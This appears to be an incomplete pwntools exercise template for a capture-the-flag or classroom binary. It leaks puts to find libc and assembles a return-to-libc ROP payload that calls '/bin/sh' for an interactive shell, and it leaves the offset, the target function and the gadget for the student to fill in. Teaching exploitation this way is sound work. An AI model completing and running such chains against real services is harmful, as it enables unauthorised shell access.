from pwn import *

p = process('./ropToQuack')

# You will probably need to adjust this for your terminal if you want to hook in gdb
#context.terminal = ['alacritty', '-e']
#gdb.attach(p, '''   b main''')

elf = ELF('./ropToQuack')
libc = ELF('./libc.so')

p.recvline()

## you need to figure out how many bytes of padding are required
offset = 

## Takes the leaked value and put it and uses it find the location of libc in memory
val = p.recvlineS()[-13:].rstrip()
vb = bytes.fromhex(val)
putsAddress = int.from_bytes(vb, byteorder='big')
print('puts: ' + hex(putsAddress))

libc.address = putsAddress - libc.symbols['puts']

binsh = next(libc.search(b'/bin/sh\x00'))
#figure out what function should be called
#you can get the function from using libc.symbols['NAME']
func = 


print('libc base: ' + hex(libc.address))
print('func: ' + hex(func))
print('binsh', hex(binsh))

# You're looking for some assembly instructions which are EXECTUBABLE that will position binsh
# in the correct place to be called by FUNC
gadget = 

payload = b'A'*offset + p64(gadget) + p64(binsh) + p64(func)
p.sendline(payload)

p.interactive()
